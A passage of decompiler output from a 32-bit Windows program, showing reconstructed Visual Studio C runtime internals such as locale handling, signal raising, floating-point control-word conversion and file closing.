    } while (iVar3 != 0);
    ___acrt_locale_release_lc_time_reference(*(undefined ***)(param_1 + 0x9c));
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___acrt_update_thread_locale_data
// 
// Library: Visual Studio 2015 Release

undefined ** ___acrt_update_thread_locale_data(void)

{
  __acrt_ptd *p_Var1;
  undefined **ppuVar2;
  
  p_Var1 = ___acrt_getptd();
  if (((*(uint *)(p_Var1 + 0x350) & DAT_0041b770) == 0) ||
     (ppuVar2 = *(undefined ***)(p_Var1 + 0x4c), ppuVar2 == (undefined **)0x0)) {
    ___acrt_lock(4);
    ppuVar2 = __updatetlocinfoEx_nolock((void **)(p_Var1 + 0x4c),DAT_0041c1d8);
    FUN_0040c72b();
    if (ppuVar2 == (undefined **)0x0) {
      _abort();
      ppuVar2 = (undefined **)___acrt_unlock(4);
      return ppuVar2;
    }
  }
  return ppuVar2;
}



void FUN_0040c72b(void)

{
  ___acrt_unlock(4);
  return;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2015 Release

undefined ** __cdecl __updatetlocinfoEx_nolock(void **param_1,undefined **param_2)

{
  undefined **ppuVar1;
  
  if ((param_2 == (undefined **)0x0) || (param_1 == (void **)0x0)) {
    param_2 = (undefined **)0x0;
  }
  else {
    ppuVar1 = (undefined **)*param_1;
    if (ppuVar1 != param_2) {
      *param_1 = param_2;
      ___acrt_add_locale_ref((int)param_2);
      if (((ppuVar1 != (undefined **)0x0) &&
          (___acrt_release_locale_ref((int)ppuVar1), ppuVar1[3] == (undefined *)0x0)) &&
         (ppuVar1 != &PTR_DAT_0041b130)) {
        ___acrt_free_locale(ppuVar1);
      }
    }
  }
  return param_2;
}



void FUN_0040c78c(void *param_1,uint param_2,uint param_3)

{
  __recalloc_base(param_1,param_2,param_3);
  return;
}



// Library Function - Single Match
//  __recalloc_base
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

LPVOID __cdecl __recalloc_base(void *param_1,uint param_2,uint param_3)

{
  int *piVar1;
  LPVOID pvVar2;
  size_t sVar3;
  uint uVar4;
  
  if ((param_2 == 0) || (param_3 <= 0xffffffe0 / param_2)) {
    if (param_1 == (void *)0x0) {
      sVar3 = 0;
    }
    else {
      sVar3 = FID_conflict___msize_base(param_1);
    }
    uVar4 = param_2 * param_3;
    pvVar2 = __realloc_base(param_1,uVar4);
    if ((pvVar2 != (LPVOID)0x0) && (sVar3 < uVar4)) {
      _memset((void *)((int)pvVar2 + sVar3),0,uVar4 - sVar3);
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    pvVar2 = (LPVOID)0x0;
  }
  return pvVar2;
}



// Library Function - Single Match
//  ___acrt_execute_initializers
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_execute_initializers(undefined **param_1,undefined **param_2)

{
  code **ppcVar1;
  code *pcVar2;
  char cVar3;
  uint uVar4;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  code **ppcVar5;
  undefined4 uVar6;
  
  uVar4 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  ppcVar5 = (code **)param_1;
  if (param_1 != param_2) {
    do {
      pcVar2 = *ppcVar5;
      if (pcVar2 != (code *)0x0) {
        _guard_check_icall();
        cVar3 = (*pcVar2)();
        in_DL = extraout_DL;
        if (cVar3 == '\0') break;
      }
      ppcVar5 = ppcVar5 + 2;
    } while (ppcVar5 != (code **)param_2);
    if ((ppcVar5 != (code **)param_2) && (ppcVar5 != (code **)param_1)) {
      ppcVar5 = ppcVar5 + -1;
      do {
        if ((ppcVar5[-1] != (code *)0x0) && (pcVar2 = *ppcVar5, pcVar2 != (code *)0x0)) {
          uVar6 = 0;
          _guard_check_icall();
          (*pcVar2)(uVar6);
          in_DL = extraout_DL_00;
        }
        ppcVar1 = ppcVar5 + -1;
        ppcVar5 = ppcVar5 + -2;
      } while (ppcVar1 != (code **)param_1);
    }
  }
  FUN_0040296a(uVar4 ^ (uint)&stack0xfffffffc,in_DL,(char)uVar4);
  return;
}



// Library Function - Single Match
//  ___acrt_execute_uninitializers
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_execute_uninitializers(undefined **param_1,undefined **param_2)

{
  code **ppcVar1;
  code *pcVar2;
  uint uVar3;
  undefined in_DL;
  undefined extraout_DL;
  code **ppcVar4;
  undefined4 uVar5;
  
  uVar3 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if (param_1 != param_2) {
    ppcVar4 = (code **)(param_2 + -1);
    do {
      pcVar2 = *ppcVar4;
      if (pcVar2 != (code *)0x0) {
        uVar5 = 0;
        _guard_check_icall();
        (*pcVar2)(uVar5);
        in_DL = extraout_DL;
      }
      ppcVar1 = ppcVar4 + -1;
      ppcVar4 = ppcVar4 + -2;
    } while (ppcVar1 != (code **)param_1);
  }
  FUN_0040296a(uVar3 ^ (uint)&stack0xfffffffc,in_DL,(char)uVar3);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Multiple Matches With Same Base Name
//  public: void (__cdecl*__thiscall __crt_seh_guarded_call<void (__cdecl*)(int)>::operator()<class
// <lambda_a048d3beccc847880fc8490e18b82769>,class <lambda_ec61778202f4f5fc7e7711acc23c3bca>&,class
// <lambda_f7496a158712204296dd6628a163878e>>(class
// <lambda_a048d3beccc847880fc8490e18b82769>&&,class
// <lambda_ec61778202f4f5fc7e7711acc23c3bca>&,class
// <lambda_f7496a158712204296dd6628a163878e>&&))(int)
//  public: void (__cdecl*__thiscall __crt_seh_guarded_call<void (__cdecl*)(int)>::operator()<class
// <lambda_cbab9ec6f41b0180b23cc171c22676b0>,class <lambda_44731a7d0e6d81c3e6aa82d741081786>&,class
// <lambda_4b292cb8dd18144e164572427af410ab>>(class
// <lambda_cbab9ec6f41b0180b23cc171c22676b0>&&,class
// <lambda_44731a7d0e6d81c3e6aa82d741081786>&,class
// <lambda_4b292cb8dd18144e164572427af410ab>&&))(int)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

uint operator____(int *param_1)

{
  byte bVar1;
  uint uVar2;
  
  ___acrt_lock(*param_1);
  bVar1 = (byte)DAT_0041b004 & 0x1f;
  uVar2 = DAT_0041b004 ^ _DAT_0041c22c;
  FUN_0040c93d();
  return uVar2 >> bVar1 | uVar2 << 0x20 - bVar1;
}



void FUN_0040c93d(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// Library Function - Single Match
//  void (__cdecl*__cdecl __acrt_lock_and_call<class <lambda_ec61778202f4f5fc7e7711acc23c3bca>>(enum
// __acrt_lock_id,class <lambda_ec61778202f4f5fc7e7711acc23c3bca>&&))(int)
// 
// Library: Visual Studio 2015 Release

FuncDef15 * __cdecl
__acrt_lock_and_call_class__lambda_ec61778202f4f5fc7e7711acc23c3bca___
          (__acrt_lock_id param_1,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ *param_2)

{
  FuncDef15 *pFVar1;
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  
  local_c = param_1;
  local_10 = param_1;
  pFVar1 = (FuncDef15 *)operator____((int *)&local_10);
  return pFVar1;
}



// Library Function - Single Match
//  void (__cdecl** __cdecl get_global_action_nolock(int))(int)
// 
// Library: Visual Studio 2015 Release

void____cdecl____int_ * __cdecl get_global_action_nolock(int param_1)

{
  if (param_1 == 2) {
    return (void____cdecl____int_ *)&DAT_0041c224;
  }
  if (param_1 != 6) {
    if (param_1 == 0xf) {
      return (void____cdecl____int_ *)&DAT_0041c230;
    }
    if (param_1 == 0x15) {
      return (void____cdecl____int_ *)&DAT_0041c228;
    }
    if (param_1 != 0x16) {
      return (void____cdecl____int_ *)0x0;
    }
  }
  return (void____cdecl____int_ *)&DAT_0041c22c;
}



// Library Function - Single Match
//  struct __crt_signal_action_t * __cdecl siglookup(int,struct __crt_signal_action_t * const)
// 
// Library: Visual Studio 2015 Release

__crt_signal_action_t * __cdecl siglookup(int param_1,__crt_signal_action_t *param_2)

{
  __crt_signal_action_t *p_Var1;
  
  p_Var1 = param_2 + 0x90;
  if (param_2 != p_Var1) {
    do {
      if (*(int *)(param_2 + 4) == param_1) {
        return param_2;
      }
      param_2 = param_2 + 0xc;
    } while (param_2 != p_Var1);
  }
  return (__crt_signal_action_t *)0x0;
}



// Library Function - Single Match
//  ___acrt_get_sigabrt_handler
// 
// Library: Visual Studio 2015 Release

void ___acrt_get_sigabrt_handler(void)

{
  _lambda_ec61778202f4f5fc7e7711acc23c3bca_ local_5;
  
  __acrt_lock_and_call_class__lambda_ec61778202f4f5fc7e7711acc23c3bca___(3,&local_5);
  return;
}



// Library Function - Single Match
//  ___acrt_initialize_signal_handlers
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_initialize_signal_handlers(FuncDef14 *param_1)

{
  __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
            ((dual_state_global_void____cdecl___int__ *)&DAT_0041c224,param_1);
  __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
            ((dual_state_global_void____cdecl___int__ *)&DAT_0041c228,param_1);
  __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
            ((dual_state_global_void____cdecl___int__ *)&DAT_0041c22c,param_1);
  __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
            ((dual_state_global_void____cdecl___int__ *)&DAT_0041c230,param_1);
  return;
}



int FUN_0040ca2d(void)

{
  __acrt_ptd *p_Var1;
  
  p_Var1 = ___acrt_getptd();
  return (int)(p_Var1 + 8);
}



// WARNING: Function: __SEH_prolog4_GS replaced with injection: SEH_prolog4
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2015 Release

int __cdecl _raise(int _SigNum)

{
  code **ppcVar1;
  __crt_signal_action_t *p_Var2;
  int *piVar3;
  undefined4 *puVar4;
  __crt_signal_action_t *p_Var5;
  __acrt_ptd *p_Var6;
  int iVar7;
  char extraout_CL;
  byte bVar8;
  char cVar9;
  code *pcVar10;
  __crt_signal_action_t **pp_Var11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 local_38;
  __crt_signal_action_t *local_34;
  char local_21;
  
  pp_Var11 = (__crt_signal_action_t **)0x0;
  local_38 = 0;
  local_21 = '\x01';
  if (8 < _SigNum) {
    if (_SigNum == 0xb) goto LAB_0040ca90;
    if ((_SigNum == 0xf) || ((0x14 < _SigNum && (_SigNum < 0x17)))) goto LAB_0040ca85;
LAB_0040cabb:
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004091be();
    goto LAB_0040cc38;
  }
  if (_SigNum == 8) {
LAB_0040ca90:
    pp_Var11 = (__crt_signal_action_t **)___acrt_getptd_noexit();
    if (pp_Var11 == (__crt_signal_action_t **)0x0) goto LAB_0040cc38;
    p_Var2 = siglookup(_SigNum,*pp_Var11);
    if (p_Var2 == (__crt_signal_action_t *)0x0) goto LAB_0040cabb;
    ppcVar1 = (code **)(p_Var2 + 8);
    cVar9 = '\0';
    local_21 = '\0';
  }
  else {
    if (_SigNum != 2) {
      if (_SigNum == 4) goto LAB_0040ca90;
      if (_SigNum != 6) goto LAB_0040cabb;
    }
LAB_0040ca85:
    ppcVar1 = (code **)get_global_action_nolock(_SigNum);
    cVar9 = extraout_CL;
  }
  local_34 = (__crt_signal_action_t *)0x0;
  if (cVar9 != '\0') {
    ___acrt_lock(3);
    cVar9 = local_21;
  }
  if (cVar9 == '\0') {
    pcVar10 = *ppcVar1;
  }
  else {
    bVar8 = (byte)DAT_0041b004 & 0x1f;
    pcVar10 = (code *)((DAT_0041b004 ^ (uint)*ppcVar1) >> bVar8 |
                      (DAT_0041b004 ^ (uint)*ppcVar1) << 0x20 - bVar8);
    cVar9 = local_21;
  }
  if (pcVar10 != (code *)0x1) {
    if (pcVar10 == (code *)0x0) {
      if (cVar9 != '\0') {
        ___acrt_unlock(3);
      }
      __exit(3);
    }
    if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
      local_34 = pp_Var11[1];
      pp_Var11[1] = (__crt_signal_action_t *)0x0;
      if (_SigNum == 8) {
        puVar4 = (undefined4 *)FUN_0040ca2d();
        local_38 = *puVar4;
        puVar4 = (undefined4 *)FUN_0040ca2d();
        *puVar4 = 0x8c;
        goto LAB_0040cb77;
      }
    }
    else {
LAB_0040cb77:
      if (_SigNum == 8) {
        p_Var2 = *pp_Var11;
        for (p_Var5 = p_Var2 + 0x24; p_Var5 != p_Var2 + 0x90; p_Var5 = p_Var5 + 0xc) {
          *(undefined4 *)(p_Var5 + 8) = 0;
        }
        goto LAB_0040cbb9;
      }
    }
    bVar8 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
    *ppcVar1 = (code *)((0U >> bVar8 | 0 << 0x20 - bVar8) ^ DAT_0041b004);
  }
LAB_0040cbb9:
  FUN_0040cbf6();
  if (pcVar10 != (code *)0x1) {
    if (_SigNum == 8) {
      p_Var6 = ___acrt_getptd();
      uVar13 = *(undefined4 *)(p_Var6 + 8);
      uVar12 = 8;
      _guard_check_icall();
      (*pcVar10)(uVar12,uVar13);
    }
    else {
      iVar7 = _SigNum;
      _guard_check_icall();
      (*pcVar10)(iVar7);
      if ((_SigNum != 0xb) && (_SigNum != 4)) goto LAB_0040cc38;
    }
    pp_Var11[1] = local_34;
    if (_SigNum == 8) {
      p_Var6 = ___acrt_getptd();
      *(undefined4 *)(p_Var6 + 8) = local_38;
    }
  }
LAB_0040cc38:
  iVar7 = FUN_004129b9();
  return iVar7;
}



void FUN_0040cbf6(void)

{
  int unaff_EBP;
  
  if (*(char *)(unaff_EBP + -0x1d) != '\0') {
    ___acrt_unlock(3);
  }
  return;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___hw_cw_sse2(uint param_1)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_1 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_1 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_1 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_1 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_1 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_1 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_1 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_1 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __clearfp
// 
// Library: Visual Studio 2015 Release

uint __cdecl __clearfp(void)

{
  uint uVar1;
  uint uVar2;
  uint in_MXCSR;
  ushort in_FPUStatusWord;
  
  if (DAT_0041bb84 < 1) {
    uVar1 = 0;
    if ((in_FPUStatusWord & 0x3f) != 0) {
      if ((in_FPUStatusWord & 1) != 0) {
        uVar1 = 0x10;
      }
      if ((in_FPUStatusWord & 4) != 0) {
        uVar1 = uVar1 | 8;
      }
      if ((in_FPUStatusWord & 8) != 0) {
        uVar1 = uVar1 | 4;
      }
      if ((in_FPUStatusWord & 0x10) != 0) {
        uVar1 = uVar1 | 2;
      }
      if ((in_FPUStatusWord & 0x20) != 0) {
        uVar1 = uVar1 | 1;
      }
      if ((in_FPUStatusWord & 2) != 0) {
        uVar1 = uVar1 | 0x80000;
      }
    }
  }
  else {
    uVar1 = 0;
    uVar2 = 0;
    if ((in_FPUStatusWord & 0x3f) != 0) {
      if ((in_FPUStatusWord & 1) != 0) {
        uVar2 = 0x10;
      }
      if ((in_FPUStatusWord & 4) != 0) {
        uVar2 = uVar2 | 8;
      }
      if ((in_FPUStatusWord & 8) != 0) {
        uVar2 = uVar2 | 4;
      }
      if ((in_FPUStatusWord & 0x10) != 0) {
        uVar2 = uVar2 | 2;
      }
      if ((in_FPUStatusWord & 0x20) != 0) {
        uVar2 = uVar2 | 1;
      }
      if ((in_FPUStatusWord & 2) != 0) {
        uVar2 = uVar2 | 0x80000;
      }
    }
    if ((in_MXCSR & 0x3f) != 0) {
      if ((in_MXCSR & 1) != 0) {
        uVar1 = 0x10;
      }
      if ((in_MXCSR & 4) != 0) {
        uVar1 = uVar1 | 8;
      }
      if ((in_MXCSR & 8) != 0) {
        uVar1 = uVar1 | 4;
      }
      if ((in_MXCSR & 0x10) != 0) {
        uVar1 = uVar1 | 2;
      }
      if ((in_MXCSR & 0x20) != 0) {
        uVar1 = uVar1 | 1;
      }
      if ((in_MXCSR & 2) != 0) {
        uVar1 = uVar1 | 0x80000;
      }
    }
    uVar1 = uVar1 | uVar2;
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2015 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  uint uVar1;
  uint uVar2;
  ushort uVar3;
  uint uVar4;
  uint in_MXCSR;
  ushort in_FPUControlWord;
  
  uVar1 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar1 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar1 = uVar1 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar1 = uVar1 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar1 = uVar1 | 0x80000;
  }
  uVar3 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar3 == 0x400) {
      uVar1 = uVar1 | 0x100;
    }
    else if (uVar3 == 0x800) {
      uVar1 = uVar1 | 0x200;
    }
    else if (uVar3 == 0xc00) {
      uVar1 = uVar1 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar1 = uVar1 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar1 = uVar1 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar1 = uVar1 | 0x40000;
  }
  uVar4 = ~_Mask & uVar1 | _NewValue & _Mask;
  if (uVar4 != uVar1) {
    uVar1 = __hw_cw(uVar4);
    uVar4 = 0;
    if ((uVar1 & 1) != 0) {
      uVar4 = 0x10;
    }
    if ((uVar1 & 4) != 0) {
      uVar4 = uVar4 | 8;
    }
    if ((uVar1 & 8) != 0) {
      uVar4 = uVar4 | 4;
    }
    if ((uVar1 & 0x10) != 0) {
      uVar4 = uVar4 | 2;
    }
    if ((uVar1 & 0x20) != 0) {
      uVar4 = uVar4 | 1;
    }
    if ((uVar1 & 2) != 0) {
      uVar4 = uVar4 | 0x80000;
    }
    uVar2 = uVar1 & 0xc00;
    if ((uVar1 & 0xc00) != 0) {
      if (uVar2 == 0x400) {
        uVar4 = uVar4 | 0x100;
      }
      else if (uVar2 == 0x800) {
        uVar4 = uVar4 | 0x200;
      }
      else if (uVar2 == 0xc00) {
        uVar4 = uVar4 | 0x300;
      }
    }
    if ((uVar1 & 0x300) == 0) {
      uVar4 = uVar4 | 0x20000;
    }
    else if ((uVar1 & 0x300) == 0x200) {
      uVar4 = uVar4 | 0x10000;
    }
    if ((uVar1 & 0x1000) != 0) {
      uVar4 = uVar4 | 0x40000;
    }
  }
  uVar1 = uVar4;
  if (0 < DAT_0041bb84) {
    uVar2 = 0;
    if ((char)in_MXCSR < '\0') {
      uVar2 = 0x10;
    }
    if ((in_MXCSR & 0x200) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((in_MXCSR & 0x400) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((in_MXCSR & 0x800) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((in_MXCSR & 0x1000) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((in_MXCSR & 0x100) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar1 = in_MXCSR & 0x6000;
    if (uVar1 != 0) {
      if (uVar1 == 0x2000) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar1 == 0x4000) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar1 == 0x6000) {
        uVar2 = uVar2 | 0x300;
      }
    }
    uVar1 = in_MXCSR & 0x8040;
    if (uVar1 == 0x40) {
      uVar2 = uVar2 | 0x2000000;
    }
    else if (uVar1 == 0x8000) {
      uVar2 = uVar2 | 0x3000000;
    }
    else if (uVar1 == 0x8040) {
      uVar2 = uVar2 | 0x1000000;
    }
    uVar1 = ~(_Mask & 0x308031f) & uVar2 | _Mask & 0x308031f & _NewValue;
    if (uVar1 != uVar2) {
      uVar1 = ___hw_cw_sse2(uVar1);
      ___set_fpsr_sse2(uVar1);
      uVar2 = 0;
      if ((char)in_MXCSR < '\0') {
        uVar2 = 0x10;
      }
      if ((in_MXCSR & 0x200) != 0) {
        uVar2 = uVar2 | 8;
      }
      if ((in_MXCSR & 0x400) != 0) {
        uVar2 = uVar2 | 4;
      }
      if ((in_MXCSR & 0x800) != 0) {
        uVar2 = uVar2 | 2;
      }
      if ((in_MXCSR & 0x1000) != 0) {
        uVar2 = uVar2 | 1;
      }
      if ((in_MXCSR & 0x100) != 0) {
        uVar2 = uVar2 | 0x80000;
      }
      uVar1 = in_MXCSR & 0x6000;
      if (uVar1 != 0) {
        if (uVar1 == 0x2000) {
          uVar2 = uVar2 | 0x100;
        }
        else if (uVar1 == 0x4000) {
          uVar2 = uVar2 | 0x200;
        }
        else if (uVar1 == 0x6000) {
          uVar2 = uVar2 | 0x300;
        }
      }
      uVar1 = in_MXCSR & 0x8040;
      if (uVar1 == 0x40) {
        uVar2 = uVar2 | 0x2000000;
      }
      else if (uVar1 == 0x8000) {
        uVar2 = uVar2 | 0x3000000;
      }
      else if (uVar1 == 0x8040) {
        uVar2 = uVar2 | 0x1000000;
      }
    }
    uVar1 = uVar2 | uVar4;
    if (((uVar2 ^ uVar4) & 0x8031f) != 0) {
      uVar1 = uVar1 | 0x80000000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2015 Release

uint __cdecl __hw_cw(uint param_1)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = (uint)((param_1 & 0x10) != 0);
  if ((param_1 & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((param_1 & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((param_1 & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((param_1 & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((param_1 & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = param_1 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((param_1 & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((param_1 & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_1 & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  _iswctype
// 
// Library: Visual Studio 2015 Release

int __cdecl _iswctype(wint_t _C,wctype_t _Type)

{
  uint uVar1;
  BOOL BVar2;
  uint local_c;
  uint local_8;
  
  if (_C == 0xffff) {
LAB_0040d177:
    uVar1 = 0;
  }
  else {
    if (_C < 0x100) {
      local_8._0_2_ = *(ushort *)(PTR_DAT_0041b714 + (uint)_C * 2);
    }
    else {
      local_c = (uint)_C;
      local_8 = 0;
      BVar2 = GetStringTypeW(1,(LPCWSTR)&local_c,1,(LPWORD)&local_8);
      if (BVar2 == 0) goto LAB_0040d177;
    }
    uVar1 = (uint)((ushort)local_8 & _Type);
  }
  return uVar1;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2015 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  CHAR in_stack_ffffffd8;
  int local_24;
  localeinfo_struct local_20;
  char local_18;
  CHAR local_14;
  CHAR local_13;
  undefined local_12;
  undefined4 local_10;
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_24,(__crt_locale_pointers *)_Locale);
  uVar2 = extraout_DL;
  if (0x100 < _C + 1U) {
    in_stack_ffffffd8 = (CHAR)((uint)_C >> 8);
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_20);
    if (iVar1 == 0) {
      local_13 = '\0';
      iVar1 = 1;
      local_14 = (CHAR)_C;
    }
    else {
      local_12 = 0;
      iVar1 = 2;
      local_14 = in_stack_ffffffd8;
      local_13 = (CHAR)_C;
    }
    local_10 = 0;
    local_c = 0;
    iVar1 = ___acrt_GetStringTypeA
                      ((__crt_locale_pointers *)&local_20,1,&local_14,iVar1,(LPWORD)&local_10,
                       (local_20.locinfo)->lc_collate_cp,1);
    uVar2 = extraout_DL_00;
    if (iVar1 == 0) {
      if (local_18 != '\0') {
        *(uint *)(local_24 + 0x350) = *(uint *)(local_24 + 0x350) & 0xfffffffd;
      }
      goto LAB_0040d284;
    }
  }
  if (local_18 != '\0') {
    *(uint *)(local_24 + 0x350) = *(uint *)(local_24 + 0x350) & 0xfffffffd;
  }
LAB_0040d284:
  iVar1 = FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar2,in_stack_ffffffd8);
  return iVar1;
}



// Library Function - Single Match
//  int __cdecl GetTableIndexFromLocaleName(wchar_t const *)
// 
// Library: Visual Studio 2015 Release

int __cdecl GetTableIndexFromLocaleName(wchar_t *param_1)

{
  ushort uVar1;
  int iVar2;
  int iVar3;
  ushort uVar4;
  ushort *puVar5;
  int local_10;
  int local_c;
  int local_8;
  
  local_10 = 0;
  local_c = 0xe3;
  while( true ) {
    local_8 = 0x55;
    iVar2 = (local_c + local_10) / 2;
    puVar5 = (ushort *)(&PTR_DAT_00417160)[iVar2 * 2];
    iVar3 = (int)param_1 - (int)puVar5;
    do {
      uVar4 = *(ushort *)(iVar3 + (int)puVar5);
      if ((0x40 < uVar4) && (uVar4 < 0x5b)) {
        uVar4 = uVar4 + 0x20;
      }
      uVar1 = *puVar5;
      if ((0x40 < uVar1) && (uVar1 < 0x5b)) {
        uVar1 = uVar1 + 0x20;
      }
      puVar5 = puVar5 + 1;
      local_8 = local_8 + -1;
    } while (((local_8 != 0) && (uVar4 != 0)) && (uVar4 == uVar1));
    if ((uint)uVar4 == (uint)uVar1) break;
    if ((int)((uint)uVar4 - (uint)uVar1) < 0) {
      local_c = iVar2 + -1;
    }
    else {
      local_10 = iVar2 + 1;
    }
    if (local_c < local_10) {
      return -1;
    }
  }
  return *(int *)(&UNK_00417164 + iVar2 * 8);
}



// Library Function - Single Match
//  ___acrt_DownlevelLocaleNameToLCID
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl ___acrt_DownlevelLocaleNameToLCID(wchar_t *param_1)

{
  uint uVar1;
  
  if (param_1 != (wchar_t *)0x0) {
    uVar1 = GetTableIndexFromLocaleName(param_1);
    if ((-1 < (int)uVar1) && (uVar1 < 0xe4)) {
      return *(undefined4 *)(&DAT_00416040 + uVar1 * 8);
    }
  }
  return 0;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2015 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    iVar2 = -1;
  }
  else {
    iVar2 = -1;
    if (((uint)_File->_flag >> 0xd & 1) != 0) {
      iVar2 = ___acrt_stdio_flush_nolock(_File);
      ___acrt_stdio_free_buffer_nolock(&_File->_ptr);
      iVar3 = __fileno(_File);
      iVar3 = __close(iVar3);
      if (iVar3 < 0) {
        iVar2 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        FID_conflict__free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    __acrt_stdio_free_stream(SUB41(_File,0));
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int __cdecl FUN_0040d3f1(FILE *param_1)

{
  int *piVar1;
  int iVar2;
  
  if (param_1 == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
  }
  else {
    if (((uint)param_1->_flag >> 0xc & 1) == 0) {
      __lock_file(param_1);
      iVar2 = __fclose_nolock(param_1);
      FUN_0040d467();
      return iVar2;
    }
    __acrt_stdio_free_stream(SUB41(param_1,0));
